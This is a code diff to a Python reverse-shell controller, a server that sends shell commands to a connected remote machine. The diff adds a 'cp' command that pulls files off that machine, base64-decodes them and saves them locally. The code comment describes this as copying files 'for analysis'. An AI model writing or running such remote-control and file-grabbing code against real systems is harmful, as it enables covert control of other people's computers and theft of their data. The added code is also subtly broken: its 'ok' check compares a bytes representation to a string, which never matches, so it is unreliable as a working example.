@@ -1,6 +1,6 @@
 import socket
 import sys
-
+import binascii
 
 # Create socket (allows two computers to connect)
 def socket_create():
@@ -45,6 +45,18 @@ def send_commands(conn):
             conn.close()
             s.close()
             sys.exit()
+        #copy files from host to server for analysis
+        if cmd[:2] =='cp':
+            conn.send(str.encode(cmd))
+            if str(conn.recv(2))=='ok':
+                f = open(cmd[3:] , 'wb')
+                client_response = binascii.a2b_base64(conn.recv(5242880))
+                f.write(client_response)
+                f.close()
+                print("File copied to server location", end="")
+            else:
+                print("File does not exist", end="")
+            continue
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024), "utf-8")
